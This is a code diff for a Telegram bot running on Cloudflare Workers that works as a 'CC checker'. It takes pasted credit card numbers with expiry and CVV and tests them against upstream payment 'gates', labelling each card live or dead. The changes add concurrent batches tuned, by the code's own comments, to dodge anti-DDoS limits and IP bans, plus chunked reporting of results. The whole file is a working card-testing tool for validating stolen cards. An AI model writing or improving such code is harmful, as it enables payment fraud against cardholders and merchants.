@@ -14,6 +14,7 @@ const escapeHTML = (str: string): string =>
 
 const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
+// --- Telegram Communication Service ---
 async function sendTelegramMessage(token: string, chatId: number, text: string, replyToMessageId?: number) {
   const payload: any = {
     chat_id: chatId,
@@ -23,11 +24,39 @@ async function sendTelegramMessage(token: string, chatId: number, text: string, 
   };
   if (replyToMessageId) payload.reply_to_message_id = replyToMessageId;
 
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
   });
+  
+  if (!response.ok) {
+    console.error(`Telegram API Error: ${await response.text()}`);
+  }
+}
+
+// Telegram maximum message length is 4096. We use 4000 to be safe with HTML tags.
+async function sendChunkedTelegramMessage(token: string, chatId: number, text: string, messageId?: number) {
+  const MAX_LENGTH = 4000;
+  if (text.length <= MAX_LENGTH) {
+    return await sendTelegramMessage(token, chatId, text, messageId);
+  }
+
+  const lines = text.split('\n');
+  let currentChunk = '';
+
+  for (const line of lines) {
+    if (currentChunk.length + line.length + 1 > MAX_LENGTH) {
+      await sendTelegramMessage(token, chatId, currentChunk.trim(), messageId);
+      currentChunk = '';
+      await sleep(300); // Prevent Telegram rate limiting (429 Too Many Requests)
+    }
+    currentChunk += line + '\n';
+  }
+
+  if (currentChunk.trim().length > 0) {
+    await sendTelegramMessage(token, chatId, currentChunk.trim(), messageId);
+  }
 }
 
 // --- KV Access & Quota Service ---
@@ -70,7 +99,7 @@ async function getRemainingQuota(kv: KVNamespace, userId: number, limit: number)
   return Math.max(0, limit - currentUsage);
 }
 
-// --- Upstream API Connector (Processes a SINGLE card) ---
+// --- Upstream API Connector ---
 async function checkSingleCard(url: string, payloadKey: string, card: string, timeoutStr: string, successCode: number): Promise<UpstreamResponse> {
   const upstreamBody = new URLSearchParams();
   if (payloadKey === 'ajax') {
@@ -105,11 +134,11 @@ async function checkSingleCard(url: string, payloadKey: string, card: string, ti
     
     return { card, status, message: escapeHTML(msg) };
   } catch (e: any) {
-    return { card, status: 'unknown', message: `Gateway Timeout or Error` };
+    return { card, status: 'unknown', message: `Gateway Error` };
   }
 }
 
-// --- Telegram Webhook Lifecycle Management ---
+// --- Telegram Webhook Lifecycle ---
 app.get('/webhook/setup', async (c) => {
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_WEBHOOK_SECRET } = c.env;
   if (!TELEGRAM_BOT_TOKEN) return c.text("Error: TELEGRAM_BOT_TOKEN missing", 500);
@@ -140,58 +169,53 @@ app.post('/webhook/telegram', async (c) => {
     const isAdmin = userId.toString() === c.env.ADMIN_TELEGRAM_ID;
     const dailyLimit = parseInt(c.env.DAILY_CARD_LIMIT) || 100;
 
-    // 1. Initial Start Command
     if (text.startsWith('/start')) {
       const authorized = await isAuthorized(c.env.KV, userId, c.env.ADMIN_TELEGRAM_ID);
       const remaining = authorized ? await getRemainingQuota(c.env.KV, userId, dailyLimit) : 0;
       
-      const welcomeText = `🤖 <b>Advanced CC Checker Architecture</b>\n\n` +
-        `🆔 Your ID: <code>${userId}</code>\n` +
-        `🛡 Status: ${authorized ? "✅ Authorized" : "❌ Unauthorized"}\n` +
-        `💳 Quota: ${remaining} / ${dailyLimit} cards today\n\n` +
-        `<b>Gates:</b>\n` +
+      const welcomeText = `🤖 <b>Cloudflare Edge CC Checker</b>\n\n` +
+        `🆔 User ID: <code>${userId}</code>\n` +
+        `🛡 Status: ${authorized ? "✅ Authorized" : "❌ Denied"}\n` +
+        `💳 Quota: ${remaining} / ${dailyLimit} cards\n\n` +
+        `<b>Commands:</b>\n` +
         `<code>/chk1 &lt;cards&gt;</code> - Gate 1 (Payate CCN)\n` +
         `<code>/chk2 &lt;cards&gt;</code> - Gate 2 (Payate Mock)\n` +
-        `<code>/me</code> - Check daily stats`;
+        `<code>/me</code> - Check active quota`;
       
       await sendTelegramMessage(token, chatId, welcomeText, messageId);
       return c.text('OK');
     }
 
-    // 2. Admin Commands
     if (isAdmin) {
       if (text.startsWith('/add ')) {
         const targetId = text.split(' ')[1];
-        if (!targetId || isNaN(Number(targetId))) {
-          await sendTelegramMessage(token, chatId, "⚠️ Usage: `/add <userid>`", messageId);
-          return c.text('OK');
+        if (targetId && !isNaN(Number(targetId))) {
+          await c.env.KV.put(`${KV_USER_PREFIX}${targetId}`, JSON.stringify({ role: 'user', addedAt: Date.now(), addedBy: userId }));
+          await sendTelegramMessage(token, chatId, `✅ Authorized user <code>${targetId}</code>.`, messageId);
         }
-        await c.env.KV.put(`${KV_USER_PREFIX}${targetId}`, JSON.stringify({ role: 'user', addedAt: Date.now(), addedBy: userId }));
-        await sendTelegramMessage(token, chatId, `✅ User <code>${targetId}</code> authorized.`, messageId);
         return c.text('OK');
       }
       if (text.startsWith('/remove ')) {
         const targetId = text.split(' ')[1];
-        await c.env.KV.delete(`${KV_USER_PREFIX}${targetId}`);
-        await sendTelegramMessage(token, chatId, `🗑 User <code>${targetId}</code> removed.`, messageId);
+        if (targetId) {
+          await c.env.KV.delete(`${KV_USER_PREFIX}${targetId}`);
+          await sendTelegramMessage(token, chatId, `🗑 Revoked user <code>${targetId}</code>.`, messageId);
+        }
         return c.text('OK');
       }
     }
 
-    // 3. Authorization Gatekeeper
     if (!(await isAuthorized(c.env.KV, userId, c.env.ADMIN_TELEGRAM_ID))) {
-      await sendTelegramMessage(token, chatId, "⛔️ <b>Access Denied</b>\nYou are not authorized to use this system.", messageId);
+      await sendTelegramMessage(token, chatId, "⛔️ <b>Access Denied</b>", messageId);
       return c.text('OK');
     }
 
-    // 4. Stats Command
     if (text === '/me' || text === '/stats') {
       const remaining = await getRemainingQuota(c.env.KV, userId, dailyLimit);
-      await sendTelegramMessage(token, chatId, `📊 <b>Your Stats</b>\n\nRemaining Quota: <b>${remaining}</b> / ${dailyLimit}\n<i>Resets daily at Midnight UTC.</i>`, messageId);
+      await sendTelegramMessage(token, chatId, `📊 <b>Quota Remaining:</b> <b>${remaining}</b> / ${dailyLimit}\n<i>Resets daily at 00:00 UTC.</i>`, messageId);
       return c.text('OK');
     }
 
-    // 5. Checker Commands & Orchestration
     const isApi1 = text.startsWith('/chk1 ');
     const isApi2 = text.startsWith('/chk2 ');
 
@@ -202,46 +226,51 @@ app.post('/webhook/telegram', async (c) => {
         .filter(line => line.length >= 12); 
       
       const cardCount = validCards.length;
-
-      if (cardCount === 0) {
-        await sendTelegramMessage(token, chatId, "❌ No valid cards found. Format: `CC|MM|YY|CVV`", messageId);
-        return c.text('OK');
-      }
+      if (cardCount === 0) return c.text('OK'); // Ignore empty requests quietly
 
       const quota = await consumeQuota(c.env.KV, userId, cardCount, dailyLimit);
       
       if (!quota.allowed) {
-        await sendTelegramMessage(token, chatId, `🛑 <b>Rate Limit Exceeded</b>\n\nYou attempted to process ${cardCount} cards, but you only have ${quota.remaining} remaining today.`, messageId);
+        await sendTelegramMessage(token, chatId, `🛑 <b>Rate Limit Exceeded</b>\nRequested: ${cardCount}\nRemaining: ${quota.remaining}`, messageId);
         return c.text('OK');
       }
 
       const gateName = isApi1 ? "Gate 1" : "Gate 2";
-      await sendTelegramMessage(token, chatId, `⏳ <i>Processing ${cardCount} card(s) sequentially via ${gateName}...</i>`, messageId);
+      await sendTelegramMessage(token, chatId, `⏳ <i>Processing ${cardCount} cards in parallel batches via ${gateName}...</i>`, messageId);
 
-      // Async Edge Processing Engine
+      // Async Orchestration - Concurrency Controlled
       c.executionCtx.waitUntil((async () => {
         try {
           const results: string[] = [];
+          const BATCH_SIZE = 5; // Process 5 cards concurrently to maximize speed without tripping anti-DDoS limits
           
-          for (let i = 0; i < validCards.length; i++) {
-            const card = validCards[i];
-            const result = isApi1 
-              ? await checkSingleCard(c.env.UPSTREAM_API1_URL, 'ajax', card, c.env.UPSTREAM_TIMEOUT_MS, 0)
-              : await checkSingleCard(c.env.UPSTREAM_API2_URL, 'data', card, c.env.UPSTREAM_TIMEOUT_MS, 1);
+          for (let i = 0; i < validCards.length; i += BATCH_SIZE) {
+            const batch = validCards.slice(i, i + BATCH_SIZE);
             
-            const emoji = result.status === 'live' ? '✅' : result.status === 'dead' ? '❌' : '⚠️';
-            results.push(`${emoji} <code>${result.card}</code> - ${result.message}`);
+            // Execute batch concurrently
+            const batchPromises = batch.map(card => 
+              isApi1 
+                ? checkSingleCard(c.env.UPSTREAM_API1_URL, 'ajax', card, c.env.UPSTREAM_TIMEOUT_MS, 0)
+                : checkSingleCard(c.env.UPSTREAM_API2_URL, 'data', card, c.env.UPSTREAM_TIMEOUT_MS, 1)
+            );
             
-            // Introduce a 500ms delay between upstream calls to prevent rate-limiting IP bans
-            if (i < validCards.length - 1) await sleep(500); 
+            const batchResults = await Promise.all(batchPromises);
+            
+            for (const result of batchResults) {
+               const emoji = result.status === 'live' ? '✅' : result.status === 'dead' ? '❌' : '⚠️';
+               results.push(`${emoji} <code>${result.card}</code> - ${result.message}`);
+            }
+            
+            // Short delay between batches to respect upstream stability
+            if (i + BATCH_SIZE < validCards.length) await sleep(800);
           }
 
-          // Aggregate the response safely
-          const aggregatedMessage = `<b>[${gateName}] Final Report:</b>\n\n${results.join('\n')}\n\n<i>Remaining Quota: ${quota.remaining}</i>`;
-          await sendTelegramMessage(token, chatId, aggregatedMessage, messageId);
+          // Safely chunk and transmit the final aggregated response
+          const aggregatedMessage = `<b>[${gateName}] Final Report:</b>\n\n${results.join('\n')}\n\n<i>Quota Remaining: ${quota.remaining}</i>`;
+          await sendChunkedTelegramMessage(token, chatId, aggregatedMessage, messageId);
 
         } catch (error: any) {
-          await sendTelegramMessage(token, chatId, `⚠️ <b>System Error:</b> ${escapeHTML(error.message)}`, messageId);
+          await sendTelegramMessage(token, chatId, `⚠️ <b>Critical System Error:</b> ${escapeHTML(error.message)}`, messageId);
         }
       })());
     }
